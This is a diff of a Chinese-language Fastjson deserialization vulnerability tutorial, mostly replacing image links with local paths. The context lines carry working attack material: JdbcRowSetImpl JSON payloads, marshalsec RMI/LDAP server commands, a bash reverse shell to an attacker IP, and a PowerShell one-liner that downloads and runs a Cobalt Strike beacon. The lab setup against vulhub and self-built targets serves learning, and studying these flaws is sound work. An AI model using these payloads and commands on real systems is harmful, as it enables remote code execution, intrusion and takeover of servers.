@@ -90,13 +90,13 @@ previous_version: "cd /opt"
 
 在`JNDI`服务中，`RMI`服务端除了直接绑定远程对象，还可以通过`References`类绑定一个外部的远程对象（当前名称目录系统之外的对象）。绑定`Reference`后，服务端先利用`Referenceable.getReference()`方法获取绑定对象的引用，并且在目录中保存。当客户端使用`lookup()`方法查找该远程对象时，会返回`ReferenceWrapper`类的代理文件，接着调用`getReference()`获取`Reference`类，获取到相应的`object factory`，最终通过`factory`类将`reference`转换为具体的对象实例。
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3icfiaC2TEFqM7T31ciavUJGUacR3UlVy5duNiafRHWiaKqRUKOJWmUVfPC3mfKfSIe45vVFASYZzUpoiaw/640?wx_fmt=jpeg)
+![](../../.resource/remote/650de3a1547fd2e7daf71821196dc673ae78ef49b02c2e8935c5af426dda3a7d.jpg)
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3icfiaC2TEFqM7T31ciavUJGUaCAEoAY7ic954uqziasrCecd6u4HzYILuUvmMFdZy94x8IA9sqmHkVBEQ/640?wx_fmt=jpeg)
+![](../../.resource/remote/d2a5c51b308f112325771fc6b5a42fdb799971f4627ee1db1a481180716c51cc.jpg)
 
 从`ReferenceWrapper`源码中也可以发现该类继承自`UnicastRmoteObject`，实现对`Reference`进行包裹，使得`Reference`类能够通过`RMI`服务进行远程访问
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3icfiaC2TEFqM7T31ciavUJGUaODkKNzkWXaFsBNmBu1NRgXeBKicLZksXIOghvrfwMNUicfJ55EdB4TIA/640?wx_fmt=jpeg)
+![](../../.resource/remote/d5fb58aab71cbdc9341c46b5cc277aae084050f3cae2854c504457dc888c032d.jpg)
 
 上面介绍了整个加载过程，则攻击利用流程如下：
 
@@ -119,7 +119,7 @@ IDEA 下载地址：
 
 https://www.jetbrains.com/idea/download/#section=windows
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3icfiaC2TEFqM7T31ciavUJGUaz3ncibWjJ482WTDmOicVynfcqG2xSK8frzSn9dR5QX3eIAiagZoFTgWYw/640?wx_fmt=jpeg)
+![](../../.resource/remote/9a0bad4f05c0fddc8ea7fd7156ae7b3a75596518bf7191347659205aac04df3e.jpg)
 
 ### 2、IDEA 安装
 
@@ -131,17 +131,17 @@ https://www.jetbrains.com/idea/download/#section=windows
 
 如图勾上，默认下一步（会出现一个小警示，直接确认跳过即可）
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3icfiaC2TEFqM7T31ciavUJGUatFWB7NiausNG7uq647h8GG8ibz3vxVicUiaLk2wtDib58LfXibEQttseTUgA/640?wx_fmt=jpeg)
+![](../../.resource/remote/652aeb515ce21840f5602e043a82d8042f968d2e39c0bc6a3ea411b411820b13.jpg)
 
 3）打开 x64 版本的`IDEA`，选择免费 30 天
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3icfiaC2TEFqM7T31ciavUJGUarJriaFow7EUOWKyYep7LSlzJXx6Znj5mibDlw18gONqLtP29EgvNcmibg/640?wx_fmt=jpeg)
+![](../../.resource/remote/0fc309a1a0ee79249c5e7cfa94769e4d0542ce30dbb10b34119c6191b6000528.jpg)
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3icfiaC2TEFqM7T31ciavUJGUaIicEIpWThNOqIVXfplKy7vknSjLw05TFXBV6awBZiaRicy2J6Bic3dhsUg/640?wx_fmt=jpeg)
+![](../../.resource/remote/c69f72aea141028c0325b74206d21c49754f00d62e78564d64d370f629569920.jpg)
 
 选择`continue`
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3icfiaC2TEFqM7T31ciavUJGUammEEZibCnIJIGbrgWWrfAZq71ChVCqH4D3BTia8HOcVAmMGEMJiaPZCMQ/640?wx_fmt=jpeg)
+![](../../.resource/remote/65c93ada315142943d47f711e169fe0aa06be9abc495aa90c40b9b6b3080053f.jpg)
 
 安装完成
 
@@ -149,13 +149,13 @@ https://www.jetbrains.com/idea/download/#section=windows
 
 默认安装，一直下一步即可
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3icfiaC2TEFqM7T31ciavUJGUaTfbXUiax25ZvfGMUYn8n4RrPYIfNnzs0ib1MvaddpHGYOLSyaUuPKWJw/640?wx_fmt=jpeg)
+![](../../.resource/remote/5225f8e2effb03576dbd54370f37ba428fc3a91d0c311fe9debdee7ebc7c2c55.jpg)
 
 ### 4、IDEA 创建新项目
 
 启动`IDEA x64`，选中刚刚装好`JDK1.8u161`版本，点击`NEXT`，填写项目名称后即可创建成功
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3icfiaC2TEFqM7T31ciavUJGUa8Lx8vnmeGujYSZSXSns7RK8q2T4xtVQhlLr68gnWEybwTibH5HqBriaQ/640?wx_fmt=jpeg)
+![](../../.resource/remote/750f22d371c89326a9c0e0f077d96f1a0f19236be712059161bbc2f1146d03c8.jpg)
 
 第一次创建项目较慢，等待片刻
 
@@ -167,29 +167,29 @@ https://mvnrepository.com/artifact/com.alibaba/fastjson
 
 **1）选择 1.2.24 版本进行下载**
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3icfiaC2TEFqM7T31ciavUJGUaEz3UxqjsIX1g1gVYeuwib27hArw6InXJ69zfUQZyFibvlI6DvxHnGMtw/640?wx_fmt=jpeg)
+![](../../.resource/remote/79b0019476a8d00d392291484814f33845e16516b562f64e34f30ffe2c59d5fe.jpg)
 
 **2）创建目录**`FJ(随意命名)`
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3icfiaC2TEFqM7T31ciavUJGUa1Z0DYXDzzdByU9NDAHgwT61lSGicbMvgEsL8BIicUpVEAMic7I6z1metw/640?wx_fmt=jpeg)
+![](../../.resource/remote/ccace61f29849b4ad353c2c8b272e7f27aaa49cf47c8e02d7f1fc3876fa15288.jpg)
 
 **3）复制`fastjson-1.2.24.jar`包至刚刚创建的目录下**
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3icfiaC2TEFqM7T31ciavUJGUanXUAZZZV6bKV1faRicd8RXJV1GIQFzCNRhwN6Ig86r0uYOgEGD9RLvg/640?wx_fmt=jpeg)
+![](../../.resource/remote/cd3928ec5be48b2557bfd5d7573d5827dc75c13557b3aa274786afe435d1bf75.jpg)
 
 **4）前往目录结构选项中**
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3icfiaC2TEFqM7T31ciavUJGUanswyWP9Bu3YCWWvg2KEibqDlIn9MSrQcxBMpRWFvcibXAYbuu2YSV61Q/640?wx_fmt=jpeg)
+![](../../.resource/remote/6ae49037b61ef25b7185282feb18cf33e597833fa6dcea03ded5ce0e36c7cb87.jpg)
 
 **5）在`Module`中导入模块，在`Dependencies`中点击加号，选择第一项**
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3icfiaC2TEFqM7T31ciavUJGUagv1zpkV5TSWuNxY9fTjAo1oWNIMFvMbeW89lnddwdrjdnGBic6h7lgQ/640?wx_fmt=jpeg)
+![](../../.resource/remote/7dc2923f87aadd98965c48aa709108f105ae608e8fd724aa5db1e97aee027172.jpg)
 
 **6）选则刚刚导入的 jar 包，确认即可**
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3icfiaC2TEFqM7T31ciavUJGUawhVJzfCar1uicq9FeasSXibUNeARNQ9OcZfWtibaFSLW1tsI1p3bJZenQ/640?wx_fmt=jpeg)
+![](../../.resource/remote/1a8bdcd5a208077d9d5b1d847324b60656061769fc410c13548c09579ec60fb8.jpg)
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3icfiaC2TEFqM7T31ciavUJGUabTIiariboAziaxqkl6aMFg0n7mXicbTwE73pWAwp1IWu3Wd3Ua5iamNRwvA/640?wx_fmt=jpeg)
+![](../../.resource/remote/56ef6c4a267987a9b8c56c11bb1b92e670c1c360b4b6ae2398ccd58367c39e63.jpg)
 
 ### 6、创建 fastjson 简单项目
 
@@ -214,7 +214,7 @@ System.out.printf(jsonStr);
 }
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3icfiaC2TEFqM7T31ciavUJGUaxiblT9DYtEXibmlV8SD4CK6IugibcSvicohOjibLDzHWscUL2d8uX9tBcXA/640?wx_fmt=jpeg)
+![](../../.resource/remote/908d5b48b5589fe425fa384f8b8af16e568abe1e04bf3c46a659ddf228f22792.jpg)
 
 创建 User 类
 
@@ -247,11 +247,11 @@ return "User{" +
 }
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3icfiaC2TEFqM7T31ciavUJGUaU7JEbiaaaic6XdP2A6YmexmtuXINRDlwLia9VFuDvD59icEoOIfqq1dVgQ/640?wx_fmt=jpeg)
+![](../../.resource/remote/2621b7c2cceaf1ef4adfa416b1e2b7e7d09640ce09c3f5431f2d73b864e1bf23.jpg)
 
 点击 run，执行 FJdemo 的 main 函数
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3icfiaC2TEFqM7T31ciavUJGUa4ABicfW8yYeIpkYnAVyHa1QRl74EXVJ1DYCwd6lg9RV75ibZk1YybmicQ/640?wx_fmt=jpeg)
+![](../../.resource/remote/10ed48613a3521c6383768364e28da7a9eece86a254548f6002fac9ef0783657.jpg)
 
 三、漏洞复现
 ------
@@ -285,7 +285,7 @@ cd vulhub/fastjson/1.2.24-rce
 sudo docker-compose up -d
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3icfiaC2TEFqM7T31ciavUJGUaYibjCfyf80ZxrD8sIYJic5S0yPzxOdZfk7oaTOXudpxGjQiaW0jO59FeQ/640?wx_fmt=jpeg)
+![](../../.resource/remote/c16dabf64fdf50f206eb02cf2213441aab9ac300fdec14ad2703fc3e387e7d41.jpg)
 
 查看靶场容器信息
 
@@ -293,7 +293,7 @@ sudo docker-compose up -d
 sudo docker ps
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3icfiaC2TEFqM7T31ciavUJGUarg8LF2OcR86iaHdtnQsbhcaXcVBfnGbWviaKLexLB79cm21v3cyI3Y7w/640?wx_fmt=jpeg)
+![](../../.resource/remote/90e937906020927ec1accf57b4f5638904fe1eb97871d9ccf24c67de96df5dcc.jpg)
 
 进入容器内查看 java 版本
 
@@ -301,11 +301,11 @@ sudo docker ps
 sudo docker exec -it 9599ad4b7cec bash
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3icfiaC2TEFqM7T31ciavUJGUa1w36iajg8CDzfVjuxwrmOGmWw1wUUNL11WUJWmjBjemkJrmXRCPR3jQ/640?wx_fmt=jpeg)
+![](../../.resource/remote/39a4f1108a8789b136ae145949c1adfad09b83dba2dbd07ad7976bc54cbcdfbe.jpg)
 
 访问靶场网址
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3icfiaC2TEFqM7T31ciavUJGUaIf3JnUQmZcicFalficn3u1FgHG7AJv6wG4ofhGxNsRExMkibbISLW40ag/640?wx_fmt=jpeg)
+![](../../.resource/remote/4df0a1f6d897637970cb8dec1507561b380b85ecd1406c6185c17bd153e30808.jpg)
 
 成功搭建完成~
 
@@ -364,7 +364,7 @@ https://github.com/mbechler/marshalsec
 git clone https://github.com/mbechler/marshalsec.git
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3icfiaC2TEFqM7T31ciavUJGUa9FuZoicVyh5icL94WibHa6FMWVko7NvAyK2JAGPxicmUibhLuHWazbZffgQ/640?wx_fmt=jpeg)
+![](../../.resource/remote/5030595297227b35ec8ad92221e3d1c8ac12126e46d1e5ad37a527bc6a4f4c0d.jpg)
 
 **3）安装 maven**
 
@@ -378,9 +378,9 @@ apt-get install maven
 mvn clean package -DskipTests
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3icfiaC2TEFqM7T31ciavUJGUaN1icw7Nxq4T7Rq2b9zYxw2pKUaQbfelgHAOIZGt3AXC0vhY9E5Awzibw/640?wx_fmt=jpeg)
+![](../../.resource/remote/2182c613140f719599672fa2b81b4be1bcd2c8e1327e4a53f0b56f1fb4174c3e.jpg)
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3icfiaC2TEFqM7T31ciavUJGUaP6ccqDgL5NXSAyD2xSaf1k5otlnNNNTt9EYPGddHflMeuRgic2XVic1w/640?wx_fmt=jpeg)
+![](../../.resource/remote/ddff6170c9d1f467cc0c5042f7e3b93d162972934e8e097edbebdc19eea9b697.jpg)
 
 **5）搭建启动 RMI 服务**
 
@@ -388,7 +388,7 @@ mvn clean package -DskipTests
 java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://192.168.112.146/#evilclass" 9999
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3icfiaC2TEFqM7T31ciavUJGUaibINy8ljP9jFEvQIJsbX72ib3qZquibqIs2iaibNrArSa1JnsqEsWN8oGOQ/640?wx_fmt=jpeg)
+![](../../.resource/remote/1bc5192f52dd878b74577a71aa0121c3e66196c7a647e7ab61ecd14d9c04390c.jpg)
 
 **6）BurpSuite 抓包改包**
 
@@ -414,15 +414,15 @@ Content-Length: 0
 }
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3icfiaC2TEFqM7T31ciavUJGUabUhSOE1I6QdaKqCyYhfIRURrtcntibFCAv8iaFZdwsBHbmbSeqY1enDw/640?wx_fmt=jpeg)
+![](../../.resource/remote/0a281997a70b2711430a81d41b27cfcf844c478b6698192e8f8a40b7976f3662.jpg)
 
 已经发送了 evilclass 文件
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3icfiaC2TEFqM7T31ciavUJGUavcp9R6mL11Nk86jfLhkw9KEJJicHbWha1TCIl3da2DTkFHqXoONcInw/640?wx_fmt=jpeg)
+![](../../.resource/remote/a4d7abe5b3100c6ddddc4188c2efeea181d0f64d5a1a0fac84ee2b4f87138120.jpg)
 
 前往靶场容器内，成功执行命令创建 test 文件
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3icfiaC2TEFqM7T31ciavUJGUaWv28W475ribkLNs1AMBjJicghz1GG1zkKzg9Rw2VEjaHPBGHCFubgicnw/640?wx_fmt=jpeg)
+![](../../.resource/remote/a79e36adc4d68ec754b911b4ea1a71829329851cec771dde4d09f8361836de09.jpg)
 
 **0x04 Linux 反弹 shell**
 
@@ -447,11 +447,11 @@ pc.waitFor();
 
 进行`javac`编译，`Burpsuite`抓包改包发包
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3icfiaC2TEFqM7T31ciavUJGUa8M3QsCndwmWxGiaHbEWp5CNWUskDeL3yxE8HsgJS77YHCntXF6XaF1Q/640?wx_fmt=jpeg)
+![](../../.resource/remote/395c52b3078f6d9e375822d34314c151dc28ec24f574b9f53761d300f91f632b.jpg)
 
 成功监听到反弹 shell
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3icfiaC2TEFqM7T31ciavUJGUaZiaDcvaiamqXWxVDUShibEYCWUoKe3N4LAm5OiciaQhFthibUE7nIliagBTNA/640?wx_fmt=jpeg)
+![](../../.resource/remote/7ce9e786e18715716175636c2fc82c9baa7d133415e0a469c510ac89be84e523.jpg)
 
 ### 2、Fastjson1.2.24 反序列化漏洞 RCE（自建 win 靶场拓展研究）
 
@@ -465,9 +465,9 @@ pc.waitFor();
 
 搭建 Spring 框架
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3icfiaC2TEFqM7T31ciavUJGUa5u1zBWxzjkYqOJfoWZEYIf8xTxBNAakkMwz4wD1Q0J6vTwvicnEHP8Q/640?wx_fmt=jpeg)
+![](../../.resource/remote/b7bc6e1339067eb81222296ed37542c252755201198246cce9c7e292a1eb5975.jpg)
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3icfiaC2TEFqM7T31ciavUJGUao3NVtVckHfHsWTuCKNUWt0PVGTzUibJdgpDuRhibL0IRnZXZzBwicdq4A/640?wx_fmt=jpeg)
+![](../../.resource/remote/38f78e4694e87ac34896a42eeae566c7b9b4df214c4d51e6999258f52ce9b39d.jpg)
 
 第一次部署较久
 
@@ -475,7 +475,7 @@ pc.waitFor();
 
 这次使用 dependency 的方式导入，将提供的 dependency 代码添加至`porn.xml`中，刷新载入即可
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3icfiaC2TEFqM7T31ciavUJGUasdWOm5UdrgicfQ5rRoJfWGXDuC2mNDS0L8s8BibQXUU3Jl4u189ic5BMQ/640?wx_fmt=jpeg)
+![](../../.resource/remote/218c147770dee9c283548df2c712b62d9a282bee732848a4acedfe903fd40010.jpg)
 
 **3）创建 java 类 - 路由解析控制器**
 
@@ -497,9 +497,9 @@ return result;
 }
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3icfiaC2TEFqM7T31ciavUJGUaDDaWjGRrhb3icvf3vzMJhAkYz8GJ85XEwjrWB9EbFlBUPeeFjiaWXLXw/640?wx_fmt=jpeg)
+![](../../.resource/remote/20034d3f2bd73857a1dcc4d59f6a3edb25a9e90820bc77ee2212e223d278fe0f.jpg)
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3icfiaC2TEFqM7T31ciavUJGUacOvVichCD24wibNZK6MVEFria4hjthnzXArE2xyalZSVZxcoqurD0EDicQ/640?wx_fmt=jpeg)
+![](../../.resource/remote/b37163f58779fb5b63464901b60acd7d19ba9e7ac904e56b5e2b9ede117dbd85.jpg)
 
 报错后面解决
 
@@ -531,29 +531,29 @@ this.id_card = id_card;
 }
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3icfiaC2TEFqM7T31ciavUJGUarCbUGkKC8bu9ia0QgY5uOw2xXIk3jLnr53ictkL1ibjTAlzIj165R6BNw/640?wx_fmt=jpeg)
+![](../../.resource/remote/1eead6aefff4012214326b569638ccde81bb1273ab03c542caa7fa041cd7a7e9.jpg)
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3icfiaC2TEFqM7T31ciavUJGUaho0ona4uO0HsfCZkmvpCIjZwibFE29Dul5RaUqNNoIq9kBGbp82QPJQ/640?wx_fmt=jpeg)
+![](../../.resource/remote/e9567f8b44857c6e9803eef315640a4e89936308851830d26afd541f1ef5b3b1.jpg)
 
 **5）解决报错问题**
 
 一般报错是缺少 class，点击`Import class`即可
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3icfiaC2TEFqM7T31ciavUJGUaR5oibzeGW7IWRMheIzagq1kDx2I8kWBGVLwmgrzBq2k1JfR6XSUP9ZA/640?wx_fmt=jpeg)
+![](../../.resource/remote/897895baf8b9dd3c94eb6a6fc416ecab9e85839894ef9d7acf9302cff7dba110.jpg)
 
 最后添加了一系列的 class 后，解决了报错问题
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3icfiaC2TEFqM7T31ciavUJGUacbico1WTLBI2CZIR0QnfndicmJDpvqFdicwho1zrsdH8ia3oTyw4J4iblAw/640?wx_fmt=jpeg)
+![](../../.resource/remote/70d5df032845401eb3e68bb5e7e254320ec37c3ba3e49996941a9e8aaf0e8fbc.jpg)
 
 **6）启动项目**
 
 点击右上角的启动
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3icfiaC2TEFqM7T31ciavUJGUaom1KZ33icWPPxprXiapN8fEvDPcKu8uico7LU60uIs6sEJiabmVx7jU60w/640?wx_fmt=jpeg)
+![](../../.resource/remote/e5b2dcc189f01441036924f249a7c7d4df621828c7383766523387c11693e6d5.jpg)
 
 搭建成功
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3icfiaC2TEFqM7T31ciavUJGUadQX3RPCY07O2WPLcFEYDGkcX53MRvmTwKicLC7FWIyghFic2YLXP6qpA/640?wx_fmt=jpeg)
+![](../../.resource/remote/d11cf05d6b96e936a1e74c317a826058a2436f831e819b2df68d3805e2881839.jpg)
 
 测试发送 json 数据
 
@@ -561,7 +561,7 @@ this.id_card = id_card;
 curl http://192.168.112.140:8080/fastjson -H "Content-Type: application/json" --data '{"name":"xiaoming", "age":18}'
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3icfiaC2TEFqM7T31ciavUJGUaOj6yag99fkaRBd5ffREvCd95VwjhX7QGMGVN0aSU8mzia9Eeict6pjEg/640?wx_fmt=jpeg)  
+![](../../.resource/remote/555c2ebc2d40b789bc57531f513cf35b6c2c465b80ec8dbb54e77b0f866a3652.jpg)  
 
 **0x03 复现过程 - 基于 LDAP 方式的反序列化漏洞利用**
 
@@ -641,7 +641,7 @@ Content-Length: 133
 }
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3icfiaC2TEFqM7T31ciavUJGUaaYicpZNZmvPARM8arBoYiaKibfqaicKVxSeaic9m38V89dmYYg7oUPQ0vYQ/640?wx_fmt=jpeg)
+![](../../.resource/remote/a82759300c9014a80f4e548fe2f81300a050586f93c326b9d6e5ff34a19bc028.jpg)
 
 经测试，使用 RMI 方式无法执行远程命令
 
@@ -674,7 +674,7 @@ pc.waitFor();
 powershell -Command (new-object System.Net.WebClient).DownloadFile('http://192.168.112.146/xigua.exe','xigua.exe');start-process xigua.exe
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3icfiaC2TEFqM7T31ciavUJGUaTOwib926HPlnW5qVjibUbpdtYfY26ctuycrbcJQfwOw475iajbTPsmSng/640?wx_fmt=jpeg)
+![](../../.resource/remote/da4ef89773f7ad352c27e70ba9788068706c339b286c5654c036ed985e799b0f.jpg)
 
 这里的 powershell 命令意思是到 192.168.112.146 主机上下载 xigua.exe 文件并以 xigua.exe 文件名存储并执行此文件，执行命令后，不出意外的话将直接上线 CS
 
@@ -684,7 +684,7 @@ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http:/
 
 使用 javac 编译，无报错即代表成功
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3icfiaC2TEFqM7T31ciavUJGUa5bOmbUP3VR2iaSib6ybSUAMPFpqYWnSjl36vVyibXcyFNJ692xhrGBWYQ/640?wx_fmt=jpeg)
+![](../../.resource/remote/c063471c70e2897d37f540614bca608b0178ad102b6ae11db36736be96646920.jpg)
 
 **2）开启 LDAP 服务和 python 的 HTTP 服务**
 
@@ -695,7 +695,7 @@ python -m SimpleHTTPServer 80
 python -m http.server 80    # python3的命令
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3icfiaC2TEFqM7T31ciavUJGUaTZdmsOtRMTdsxpy2NMT60YI6bX0Fk4oU56QeH98o5xBCaP3X2icG2Gw/640?wx_fmt=jpeg)
+![](../../.resource/remote/cf2da4d0d8ce947957aaf0ad05b333f00717af7ba1afe44d56b8becfd007bfd5.jpg)
 
 开启 python2 简易 http 服务
 
@@ -718,13 +718,13 @@ Content-Length: 133
 }
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3icfiaC2TEFqM7T31ciavUJGUaWgiczbICJCxI4BkQ0Krqu7tyEonVj28xQNzDC8vNHd7cKFBGDjM89lQ/640?wx_fmt=jpeg)
+![](../../.resource/remote/473a8ec55984747fcfda99bc36a412475ec667987d59ab1c1544d99d600be8fa.jpg)
 
 **3）启动 Cobalt Strike 及生成木马文件**
 
 设置监听器，创建木马上线文件，命名为`xigua.exe`，并复制到`Kali Linux`上，可以直接通过上面开启的 python2 的 http 服务访问得到。
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3icfiaC2TEFqM7T31ciavUJGUaiahN1gCEZ5latlW2wWO8JMcp9kVcd5dfarhfOibv1rxfGKRO1aS3gH4A/640?wx_fmt=jpeg)
+![](../../.resource/remote/cb1b5153a6ec2681fd8f487c0fc4f5c8fb9135c675085e8ff86398849f5c1f2a.jpg)
 
 **4）BurpSuite 抓包修改**
 
@@ -734,11 +734,11 @@ sudo docker-compose up -d
 sudo docker ps
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3icfiaC2TEFqM7T31ciavUJGUaxOBgnhWlNaiaTgTicRibda3vJzSdlyDeVoCQf099Uj2kAmtS1tVDuxq8g/640?wx_fmt=jpeg)
+![](../../.resource/remote/0a6dbd831e074d3dd745de3fca741b8d028bae21eb09a2fe47d1d5e6fbcc9bc2.jpg)
 
 **5）成功上线 CS**
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3icfiaC2TEFqM7T31ciavUJGUaCYFTe3wZFxt8QkFSLETY5fMhwpJ4gBkKR5LD5JnW5ia747FHlLGgKiaA/640?wx_fmt=jpeg)
+![](../../.resource/remote/9088b75ed3fc23fc72e5f41f83d5c67111e43ab9cb5146e270cff20dbc0bb5ae.jpg)
 
 ### 3、Fastjson1.2.47 反序列化漏洞（CNVD‐2019‐22238）
 
@@ -754,7 +754,7 @@ Fastjson1.2.24 后增加了反序列化白名单，Fastjson 中 autotype 功能�
 java -cp fastjson_tool.jar fastjson.HLDAPServer 192.168.112.146 8888 "bash=/bin/bash -i  >& /dev/tcp/192.168.112.146/9001 0>&1"
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3icfiaC2TEFqM7T31ciavUJGUaKzHJM2IQ17yOoMMTibQM87LQxYrms6ErC24Ouuxohia5gjKC6P0VDpsQ/640?wx_fmt=jpeg)
+![](../../.resource/remote/75a21115c62f97cbc573a14cdf1d4eaebfe664c6c9cbf2a5975b8fbc538f9ed7.jpg)
 
 **0x03 复现操作 - 监听反弹 shell**
 
@@ -783,7 +783,7 @@ Content-Length: 189
 {"e":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"f":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://192.168.112.146:8888/Object","autoCommit":true\}\}
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3icfiaC2TEFqM7T31ciavUJGUaIJ9sqyD0IsZd9k3s6CW5l5xQL9qSaFOnrsefW60dpgewW2ovt24qHQ/640?wx_fmt=jpeg)
+![](../../.resource/remote/ac10fdddaef190c29804c725072f743f85f6b052f0f8b91b3df068679ef376be.jpg)
 
 **2）访问网站，burpsuite 抓包修改**
 
@@ -791,7 +791,7 @@ Content-Length: 189
 nc -lvp 9001
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3icfiaC2TEFqM7T31ciavUJGUaoibx0pvzicKADFcciayic5UJPEFf1vQsyJbD9RWgtuVgEvQRtPLJa4zSbA/640?wx_fmt=jpeg)  
+![](../../.resource/remote/9462bb21c9b43f50fb58c79c642a3cf7dae868ed715da39446b48f062a6f3d65.jpg)  
 
 **3）监听反弹 shell**
 
@@ -799,7 +799,7 @@ nc -lvp 9001
 {"@type":"org.apache.xbean.propertyeditor.JndiConverter","AsText":"rmi://127.0.0.1:1099/exploit"}";
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3icfiaC2TEFqM7T31ciavUJGUazlfbClheHs1fWiceReFFdm9mQ0IzYn8Qfdh90v3wlLdhQhOG9TJ2yRA/640?wx_fmt=jpeg)
+![](../../.resource/remote/4aa34fdc395c1c414b24eb373d1b9e6df40556ef23ec0a6b44a85f5b7e3e06d8.jpg)
 
 **0x04 原理分析**
 
@@ -969,7 +969,7 @@ java -cp fastjson_tool.jar fastjson.HLDAPServer 192.168.112.146 8888 "curl 8067n
 {"e":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"f":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://192.168.112.146:8888/Object","autoCommit":true\}\}
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3icfiaC2TEFqM7T31ciavUJGUa94ibCXMMBK3kLfEd3ZQS1zC2Nf6co48PCcn305Kuib5IfHsBWhRibOpeA/640?wx_fmt=jpeg)
+![](../../.resource/remote/dc17c176c89b849e1d41a73154e5c6f34c8d68c6134dcecd81d1a14a9a74f55e.jpg)
 
 2）搭建 LDAP 服务器
 
@@ -977,7 +977,7 @@ java -cp fastjson_tool.jar fastjson.HLDAPServer 192.168.112.146 8888 "curl 8067n
 java -cp fastjson_tool.jar fastjson.HLDAPServer 192.168.112.146 8888 "bash=/bin/bash -i  >& /dev/tcp/192.168.112.146/9001 0>&1"
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3icfiaC2TEFqM7T31ciavUJGUa2PBYCibIGeUPAfpweHzLII4PbTApt95dvnaqDEv4wPbgsZsHic88tfgw/640?wx_fmt=jpeg)
+![](../../.resource/remote/18afa1159e328dada394e6979f71d02eda8848e56e47c185b0f9460ecffc8044.jpg)
 
 3）BP 改包
 
@@ -987,13 +987,13 @@ java -cp fastjson_tool.jar fastjson.HLDAPServer 192.168.112.146 8888 "bash=/bin/
